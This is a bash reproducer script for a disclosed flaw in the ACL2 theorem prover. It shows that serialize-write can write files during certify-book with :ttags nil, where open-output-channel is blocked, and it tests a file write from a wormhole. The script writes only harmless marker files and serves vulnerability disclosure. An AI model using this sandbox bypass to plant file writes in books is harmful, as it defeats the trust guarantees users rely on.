#!/usr/bin/env bash
# Reproducer for Finding 2:
#   (a) Pure state-free :logic function writes arbitrary file from inside a wormhole
#       during defthm simplification (:ttags nil).
#   (b) certify-book (:ttags nil) blocks open-output-channel (writes-okp = nil)
#       yet allows serialize-write to overwrite arbitrary files with :ttags nil.
set -euo pipefail
cd "$(dirname "$0")"

SBCL_ACL2="${1:-/Users/ember/dev/acl2-fix/head-worktree/saved_acl2}"
CCL_ACL2="${2:-/Users/ember/dev/acl2-fix/ccl-worktree/saved_acl2}"
TIMEOUT="/opt/homebrew/bin/timeout --kill-after=10s 120s"

cleanup() {
  rm -f wormhole_pwned.sao cert_blocked.txt cert_bypassed.sao \
        blocked_book.lisp blocked_book.cert blocked_book.port blocked_book.fasl blocked_book.*fsl \
        wb_book.lisp wb_book.cert wb_book.port wb_book.fasl wb_book.*fsl ./*.out
}
trap cleanup EXIT
cleanup

cat > blocked_book.lisp <<'EOF'
(in-package "ACL2")
(make-event
 (mv-let (ch state)
   (open-output-channel "cert_blocked.txt" :character state)
   (declare (ignore ch))
   (value '(defun blocked-witness () t))))
EOF

cat > wb_book.lisp <<'EOF'
(in-package "ACL2")
(make-event
 (let ((state (serialize-write "cert_bypassed.sao" '(:written-during-certify-book))))
   (mv-let (val state)
     (serialize-read "cert_bypassed.sao")
     (prog2$
      (cw "@SANDBOX-CERT host=~x0 writes-okp=~x1 serialize-wrote=~x2 ttags=~x3~%"
          (@ host-lisp)
          (f-get-global 'writes-okp state)
          val
          (global-val 'ttags-seen (w state)))
      (value '(defun wb-witness () t))))))
EOF

for pair in "SBCL:$SBCL_ACL2" "CCL:$CCL_ACL2"; do
  lbl="${pair%%:*}"
  bin="${pair#*:}"
  rm -f wormhole_pwned.sao cert_blocked.txt cert_bypassed.sao \
        blocked_book.cert blocked_book.port blocked_book.fasl blocked_book.*fsl \
        wb_book.cert wb_book.port wb_book.fasl wb_book.*fsl
  echo "=== $lbl ==="
  $TIMEOUT "$bin" < repro.lisp > "wh_${lbl}.out" 2>&1
  grep -a '@SANDBOX-WORMHOLE' "wh_${lbl}.out"
  echo "wormhole_pwned.sao exists on disk: $([ -f wormhole_pwned.sao ] && echo YES || echo NO)"

  printf '(certify-book "blocked_book" 0 t :ttags nil)\n(quit)\n' | $TIMEOUT "$bin" > "blk_${lbl}.out" 2>&1 || true
  printf '(certify-book "wb_book" 0 t :ttags nil)\n(quit)\n' | $TIMEOUT "$bin" > "cert_${lbl}.out" 2>&1
  grep -a '^ACL2 !>@SANDBOX-CERT|^@SANDBOX-CERT' "cert_${lbl}.out" || grep -a '@SANDBOX-CERT host=:' "cert_${lbl}.out"
  echo "open-output-channel book certified: $([ -f blocked_book.cert ] && echo YES || echo NO), cert_blocked.txt exists: $([ -f cert_blocked.txt ] && echo YES || echo NO)"
  echo "serialize-write book certified (:ttags nil): $([ -f wb_book.cert ] && echo YES || echo NO), cert_bypassed.sao exists: $([ -f cert_bypassed.sao ] && echo YES || echo NO)"
done
